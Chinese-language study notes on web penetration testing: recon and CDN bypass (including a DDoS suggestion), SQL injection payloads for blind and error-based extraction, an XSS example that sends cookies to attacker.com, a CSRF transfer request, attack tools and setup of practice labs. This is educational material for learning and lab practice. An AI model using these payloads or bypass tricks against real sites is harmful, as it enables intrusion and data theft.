

# 基础知识

## 信息收集

- DNS解析：可以找其他二级域名，从防护较弱的分站攻破；DNS污染
- CDN（Content Distribution Network）：需要绕过CDN节点
  - 判断网站有没有用CDN：[超级ping](https://ping.chinaz.com)、[get-site-ip](https://get-site-ip.com/)
  - 绕过CDN方法
    - 子域名查询：有的网站主站和分站搭在同一个服务器上，但分站并未开CDN（甚至可能`www.example.com`开了CDN，`example.com`没开）
    - 可从该站点发出的邮件源码分析（比如注册账号时的验证邮件）
    - 国外地址请求：一般不会为海外地址部署CDN，从国外访问到的就是真实地址。最暴力的可以从全球访问，其中必定有服务器真实地址
    - 黑暗引擎搜索特征文件
    - 查找DNS历史记录，找启用CDN之前的ip
    - ddos攻击，打光网站CDN流量

  - 判断找到的是不是真实地址：多方法相互验证；改hosts，正常访问就没错

- web架构
  - 源码
  - 中间件（搭建平台）
  - 数据库
  - 操作系统
  - 第三方软件
- 加密：aes，des



收集信息时，也要找相关网站，比如渗透`www.example.com`时，也要收集

- 子目录，如`www.example.com/news/`
- 子域名，如`bbs.example.com`
- 其他端口
- 旁注，即同一服务器上运行的其他网站
- C段，即同网段的其他网站

这些都和要渗透的网站有或紧密或松散的联系，可能从中找到机会

# SQL注入

1. 寻找注入点
2. 获取敏感数据
3. 完成攻击

## 获取敏感数据

常见敏感数据

- 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`
- 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，我们比较关心的有：

| 表名       | 字段名                                  | 包含信息                             |
| ---------- | --------------------------------------- | ------------------------------------ |
| `schemata` | `schema_name`                           | 数据库名                             |
| `tables`   | `table_name, table_schema`              | 表名，以及该表所属数据库名           |
| `columns`  | `column_name, table_name, table_schema` | 字段名，以及该字段所属表名、数据库名 |

示例SQL语句：

```sql
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'; -- 获取users表的列名
```

获得敏感数据的方式

- `UNION`查询注入：只要注入点为`SELECT`语句便可用`UNION`查询获取数据
- 报错注入：MySQL 5.1及以上版本的`updatexml`和`extractvalue`函数
  - 两个函数的定义分别是：`updatexml(XML_document, XPath, new_value)`，`extractvalue(XML_document, XPath)`
  - `updatexml(1, concat(0x7e, (select user())), 2)`

## 盲注

web应用进行数据库操作之后可能不会回显，比如只显示“查询成功”或“查询失败”，甚至连成功与否都不告诉用户。这种情况下通过注入获取信息的方法就叫盲注

**布尔盲注**

1. 找注入点
2. 构造条件。这个条件的真假影响回显。例如若payload`' or '1'='1`回显“查询成功”，`' or '1'='2`回显“查询失败”，这个payload就是合格的条件
3. 将条件替换成注入的数据，例如下面的语句。替换参数，不断尝试直到爆破出整条数据

```sql
SELECT * FROM users WHERE id='' or length(database()) < 16;
SELECT * FROM users WHERE id='' or substr(database(), 1, 1) = 'a';
```

常用的字符串截取方法：

```sql
SELECT substr('a', 1, 1), mid('a', 1, 1), right('a', 1), left('a', 1);
regexp, rlike, trim, insert, like;
```

**延时盲注**

若完全没有回显，可以利用延时判断条件真假，如：

```sql
SELECT name FROM users WHERE id='' UNION SELECT IF((1=1), sleep(5), 0);
SELECT name FROM users WHERE id='' UNION SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END;
SELECT name FROM users WHERE id='' UNION SELECT sleep(5*(1=1));
```

网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法：

```sql
SELECT benchmark(1000000, sha1('a'));    # 重复执行sha实现延时
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状态机复杂匹配
```

**报错盲注**

若服务器没有回显，又禁用了延时盲注的关键字，可以尝试构造SQL ERROR强行获得回显

```sql
SELECT exp(709 + (1=1));
SELECT cot(1 - (1=1));
SELECT pow(1 + (1=1), 99999);
```

参考：[一文搞定MySQL盲注](https://www.anquanke.com/post/id/266244#h2-1)

## 技巧

**空格**

可以替换为行内注释`/**/`、换行符`%0d%0a`、括号、反引号

```sql
SELECT/**/id/**/FROM/**/users;
SELECT(id)FROM(users);
SELECT`id`FROM`users`;
```

# 跨站脚本（XSS）

跨站脚本（Cross-Site Scripting，简称XSS。第一个字母改为X以避免和样式层叠表CSS冲突）是网站显示用户输入（比如显示评论）时，字符串被浏览器误当作代码解析执行从而产生危害。例如如下文本可能被当作javascript执行，在用户不知情之下将Cookie发送到攻击者服务器：

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

XSS只能影响到用户前端，无法直接作用于服务器

- 反射型，如搜索功能
- 存储型，如评论
- DOM型，如动态内容加载、单页应用、AJAX请求

# CSRF

CSRF（Cross-Site Requet Forgery，跨站请求伪造）利用用户浏览器的Cookie，以用户名义在目标网站上执行攻击操作。例如：

1. 用户登录银行网站，会话保持有效
2. 用户访问攻击者的恶意页面，该页面隐藏一个自动提交的请求，如`<img src="http://bank.com/transfer?to=attacker&amount=1000 />"`
3. 用户的浏览器自动携带Cookie发送请求，银行网站误认为是合法操作，执行转账

防御措施通常有：

- CSRF Token
- SameSite Cookie
- 验证Referer

# SSRF

SSRF（Server-Side Request Forgery，服务器端请求伪造）是攻击者通过操纵服务器发出请求获取敏感信息



# 工具

## Burp Suite

## Metasploit Framework

`msfrpcd`

## netcat

简称nc，有数据传输、端口监听、远程连接等功能

## Nmap

用于主机发现、端口扫描的工具

## 其他

- wafw00f：waf识别
- 目录扫描：dirb，dirsearch，gobuster
- weevely：生成php后门
- deepseek建议的工具：hydra，sqlmap

## 在线工具

- [hash反向查询](https://www.cmd5.com)
- 黑暗搜索引擎
  - https://www.shodan.io/
  - https://www.zoomeye.org/
  - https://fofa.info/
  - https://hunter.qianxin.com/
  - https://quake.360.net/quake/#/index
  - https://x.threatbook.cn

# 搭建靶场

## Vulhub

[项目主页](https://vulhub.org/)

1. 安装Docker：`curl -s https://get.docker.com/ | sh `
2. 下载Vulhub：`git clone https://github.com/vulhub/vulhub.git`
3. 选择环境：`cd flask/ssti`
4. 启动靶场：`docker compose up -d`
5. 访问靶场：用`docker ps`查看端口号、`ip addr show`查看主机ip访问
6. 关闭靶场：`docker compose down`。为了避免被他人恶意利用，测试结束后一定记得关闭环境

过程中可能报以下错误：

- **`docker: Got permission denied`**：没有docker权限，需要执行以下命令：`sudo groupadd docker`，`sudo usermod -aG docker $USER`，`newgrp docker`
- **`unexpected keyword argument 'ssl_version'`**：使用`docker compose up -d`指令启动。不要用官方教程的`docker-compose`，那是旧版本的
- **加载超时**：docker官网被墙了，需要开代理或者换镜像站，设置方法是在`\etc\docker\daemon.json`中加入如下内容（代理或镜像选一个即可）然后重启

```json
{
  "proxies": {
    "http-proxy": "http://proxy.example.com:3128",
    "https-proxy": "https://proxy.example.com:3129",
    "no-proxy": "*.test.example.com,.example.org,127.0.0.0/8"
  }

  "registry-mirrors": ["https://mirror.com"]
}
```

## pikachu

1. 安装[小皮面板](https://www.xp.cn/product-download)（Linux），或者[phpStudy](https://www.xp.cn/php-study)（Windows）
2. 用浏览器登录面板，然后在网站和数据库界面分别安装apache和mysql
3. 下载pikachu，并复制到`/xp/www`
4. 在面板的“网站”界面选择添加网站 - 手动创建，域名随便绑一个端口，根目录`/xp/www/pikachu`（即上一步复制的目录），然后点下一步
5. 随便选个php版本，并创建MySQL数据库。将数据库账号、密码写进`config.inc.php`（位于`/xp/www/pikachu/inc`）
6. 打开网站（可在面板 - 网站点击网站名打开），访问`/install.php`，点击初始化
